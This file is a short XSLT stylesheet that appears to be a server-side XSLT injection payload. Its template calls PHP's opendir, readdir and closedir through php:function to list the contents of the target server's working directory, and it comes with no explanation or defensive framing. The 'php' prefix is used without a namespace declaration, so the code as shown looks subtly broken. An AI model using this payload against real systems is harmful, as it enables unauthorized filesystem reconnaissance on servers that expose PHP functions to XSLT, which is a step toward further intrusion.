<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="dir" select="php:function('opendir', '.')"/>
    <xsl:value-of select="php:function('readdir', $dir)"/>
    <xsl:value-of select="php:function('readdir', $dir)"/>
    <xsl:value-of select="php:function('readdir', $dir)"/>
    <xsl:value-of select="php:function('readdir', $dir)"/>
    <xsl:value-of select="php:function('readdir', $dir)"/>
    <xsl:value-of select="php:function('closedir', $dir)"/>
  </xsl:template>
</xsl:stylesheet>
